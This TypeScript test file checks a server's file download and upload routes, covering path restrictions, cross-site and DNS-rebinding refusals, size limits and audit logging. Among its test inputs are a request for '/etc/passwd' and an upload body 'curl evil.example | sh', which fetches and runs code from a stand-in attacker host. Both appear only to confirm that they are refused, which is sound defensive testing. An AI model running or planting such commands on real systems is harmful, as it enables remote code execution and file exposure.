import { createServer, request } from "node:http";
import type { AddressInfo } from "node:net";
import { NodeHttpServer } from "@effect/platform-node";
import { SqliteClient } from "@effect/sql-sqlite-node";
import { afterAll, beforeAll, describe, expect, it } from "vite-plus/test";
import { type Context, Effect, Exit, Layer, Option, Scope, Stream } from "effect";
import { HttpRouter } from "effect/http";
import { SqlClient } from "effect/sql";
import { auditLogLayer, migrateAudit } from "../features/audit/public.ts";
import { ComputerActFailed, Computers } from "../features/computers/public.ts";
import { fakeComputer } from "../features/computers/testing/fake-computer.ts";
import { gatewayLayer, migrateGateway } from "../features/gateway/public.ts";
import { fileRoutes } from "./file-routes.ts";

/** What the fake workspace holds, by path, and every upload it was asked to save. */
const stored = new Map<string, Uint8Array>([
  ["reports/übersicht 2026.csv", Uint8Array.from([0, 44, 10, 0])],
]);

const uploads: Array<string> = [];

/** Every download the fake computer was asked for, and each whose body it stopped sending. */
const downloads: Array<string> = [];

const stopped: Array<string> = [];

/** A file the fake computer sends the first byte of, and then nothing until it is stopped. */
const endless = "endless.bin";

/** The file at `path` as the fake workspace sends it. */
function sending(path: string) {
  if (path === endless) {
    return Effect.succeed({
      bytes: 2,
      body: Stream.make(Uint8Array.from([1])).pipe(
        Stream.concat(Stream.never),
        Stream.onExit(() => Effect.sync(() => stopped.push(path))),
      ),
    });
  }

  return Option.match(Option.fromNullishOr(stored.get(path)), {
    onNone: () =>
      Effect.fail(
        new ComputerActFailed({ reason: "failed", message: `There is nothing at ${path}.` }),
      ),
    onSome: (bytes) => Effect.succeed({ bytes: bytes.length, body: Stream.make(bytes) }),
  });
}

const computer = fakeComputer({
  download: (path) =>
    Effect.andThen(
      Effect.sync(() => downloads.push(path)),
      sending(path),
    ),
  upload: (path, body) =>
    Stream.runCollect(Stream.orDie(body)).pipe(
      Effect.map((pieces) => {
        const bytes = Buffer.concat(pieces);
        uploads.push(path);
        stored.set(path, bytes);

        return { path, bytes: bytes.length };
      }),
    ),
});

const computers = Layer.succeed(
  Computers,
  Computers.of({
    ensure: Effect.succeed(computer),
    running: Effect.succeed(computer),
    stop: Effect.void,
    reset: Effect.void,
    list: Effect.succeed([]),
    screen: Stream.never,
  }),
);

const database = Layer.effectDiscard(Effect.andThen(migrateAudit, migrateGateway)).pipe(
  Layer.provideMerge(SqliteClient.layer({ filename: ":memory:" })),
);

const http = createServer();

const scope = Effect.runSync(Scope.make());

let served: Context.Context<SqlClient.SqlClient>;

beforeAll(async () => {
  const server = HttpRouter.serve(
    fileRoutes(Option.none()).pipe(
      Layer.provide(gatewayLayer.pipe(Layer.provide([auditLogLayer, computers]))),
    ),
    { disableLogger: true, disableListenLog: true },
  ).pipe(
    Layer.provide(NodeHttpServer.layer(() => http, { port: 0, host: "127.0.0.1" })),
    Layer.provideMerge(database),
  );

  served = await Effect.runPromise(Layer.buildWithScope(server, scope));
});

/** The decision of every audit row about `path`, the allow and its outcome, in order. */
function decisionsAbout(path: string): Promise<ReadonlyArray<string>> {
  return Effect.runPromise(
    Effect.flatMap(
      SqlClient.SqlClient,
      (sql) =>
        sql<{ readonly decision: string }>`
        SELECT outcome.decision FROM audit_rows AS outcome
        LEFT JOIN audit_rows AS allowed ON allowed.id = outcome.outcome_of
        WHERE json_extract(coalesce(allowed.detail, outcome.detail), '$.path') = ${path}
        ORDER BY outcome.seq
      `,
    ).pipe(
      Effect.map((rows) => rows.map(({ decision }) => decision)),
      Effect.provide(served),
    ),
  );
}

afterAll(() => Effect.runPromise(Scope.close(scope, Exit.void)));

function base(): string {
  // SAFETY: a server listening on a host and port, not a pipe, reports an `AddressInfo`.
  return `http://127.0.0.1:${(http.address() as AddressInfo).port}`;
}

const fileUrl = (path: string) => `${base()}/files?path=${encodeURIComponent(path)}`;

/** The status a download of `path` sent with exactly `headers` is answered with. */
function downloadStatus(path: string, headers: Record<string, string>): Promise<number> {
  return new Promise((resolve, reject) => {
    const sent = request(fileUrl(path), { headers });

    sent.on("response", (response) => {
      resolve(response.statusCode ?? 0);
      response.resume();
    });
    sent.on("error", reject);
    sent.end();
  });
}

/**
The status an upload that says it is `length` bytes is answered with, before any of its body is sent: the
request's headers go out and its body never does.
*/
function statusBeforeBody(path: string, length: number): Promise<number> {
  return new Promise((resolve, reject) => {
    const sent = request(fileUrl(path), {
      method: "PUT",
      headers: { "content-length": String(length) },
    });

    sent.on("response", (response) => {
      resolve(response.statusCode ?? 0);
      sent.destroy();
    });
    sent.on("error", (error) => (sent.destroyed ? undefined : reject(error)));
    sent.flushHeaders();
  });
}

describe("GET /files", () => {
  it("sends a file's exact bytes, to save under its own name", async () => {
    const response = await fetch(fileUrl("reports/übersicht 2026.csv"), {
      headers: { "sec-fetch-site": "same-origin" },
    });

    expect(response.status).toBe(200);
    expect(response.headers.get("content-length")).toBe("4");
    expect(response.headers.get("content-disposition")).toBe(
      `attachment; filename="_bersicht 2026.csv"; filename*=UTF-8''%C3%BCbersicht%202026.csv`,
    );
    expect(new Uint8Array(await response.arrayBuffer())).toEqual(Uint8Array.from([0, 44, 10, 0]));
  });

  it("answers 403 to a path outside the workspace, and 502 to a file that is not there", async () => {
    const outside = await fetch(fileUrl("/etc/passwd"));
    const missing = await fetch(fileUrl("gone.csv"));

    expect(outside.status).toBe(403);
    expect(missing.status).toBe(502);
    expect(await missing.json()).toEqual({ message: "There is nothing at gone.csv." });
  });

  it("refuses a page at a name that is not this server's, even when it sends no Origin", async () => {
    const rebound = `evil.example:${new URL(base()).port}`;

    expect(
      await downloadStatus("reports/übersicht 2026.csv", {
        host: rebound,
        "sec-fetch-site": "same-origin",
      }),
    ).toBe(403);
    expect(
      await downloadStatus("reports/übersicht 2026.csv", {
        host: rebound,
        origin: `http://${rebound}`,
        "sec-fetch-site": "same-origin",
      }),
    ).toBe(403);
  });

  it("sends the file to this machine's own page, with an Origin or without", async () => {
    const own = new URL(base()).host;

    expect(
      await downloadStatus("reports/übersicht 2026.csv", {
        host: own,
        "sec-fetch-site": "same-origin",
      }),
    ).toBe(200);
    expect(
      await downloadStatus("reports/übersicht 2026.csv", {
        host: `localhost:${new URL(base()).port}`,
        origin: `http://localhost:${new URL(base()).port}`,
      }),
    ).toBe(200);
  });

  it("answers 400 without a path, saying so as the computer does", async () => {
    const response = await fetch(`${base()}/files`, {
      headers: { "sec-fetch-site": "same-origin" },
    });

    expect(response.status).toBe(400);
    expect(await response.json()).toEqual({ message: "Say which file with ?path=." });
  });

  it("answers a HEAD 405 without asking the computer or auditing a download", async () => {
    const response = await fetch(fileUrl("asked.csv"), {
      method: "HEAD",
      headers: { "sec-fetch-site": "same-origin" },
    });

    expect(response.status).toBe(405);
    expect(response.headers.get("allow")).toBe("GET, PUT");
    expect(downloads).not.toContain("asked.csv");
    expect(await decisionsAbout("asked.csv")).toEqual([]);
  });

  it("records a download the person left before its last byte as unknown, and stops the computer's", async () => {
    await new Promise<void>((resolve, reject) => {
      const sent = request(fileUrl(endless), { headers: { "sec-fetch-site": "same-origin" } });

      sent.on("response", (response) => {
        response.once("data", () => {
          sent.destroy();
          resolve();
        });
      });
      sent.on("error", (error) => (sent.destroyed ? undefined : reject(error)));
      sent.end();
    });

    await expect.poll(() => decisionsAbout(endless)).toEqual(["allow", "unknown"]);
    expect(stopped).toEqual([endless]);
  });

  it("refuses a link or an image another site points here", async () => {
    const response = await fetch(fileUrl("reports/übersicht 2026.csv"), {
      headers: { "sec-fetch-site": "cross-site" },
    });

    expect(response.status).toBe(403);
  });
});

describe("PUT /files", () => {
  it("puts the body into the workspace and answers what was saved", async () => {
    const response = await fetch(fileUrl("expenses.csv"), {
      method: "PUT",
      body: "date,amount\n2026-10-01,12.50\n",
    });

    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({ path: "expenses.csv", bytes: 29 });
    expect(new TextDecoder().decode(stored.get("expenses.csv"))).toBe(
      "date,amount\n2026-10-01,12.50\n",
    );
  });

  it("answers 413 to a 101 MiB upload before a byte of it is sent", async () => {
    expect(await statusBeforeBody("big.bin", 101 * 1024 * 1024)).toBe(413);
    expect(uploads).not.toContain("big.bin");
  });

  it("refuses an upload from another site's page, before the computer hears of it", async () => {
    const response = await fetch(fileUrl("planted.sh"), {
      method: "PUT",
      headers: { origin: "https://evil.example" },
      body: "curl evil.example | sh",
    });

    expect(response.status).toBe(403);
    expect(uploads).not.toContain("planted.sh");
  });

  it("answers 411 to an upload that does not say its length", async () => {
    const status = await new Promise<number>((resolve, reject) => {
      const sent = request(fileUrl("streamed.bin"), { method: "PUT" });

      sent.on("response", (response) => resolve(response.statusCode ?? 0));
      sent.on("error", reject);
      sent.write("sent in chunks, ");
      sent.end("so without a length");
    });

    expect(status).toBe(411);
    expect(uploads).not.toContain("streamed.bin");
  });
});
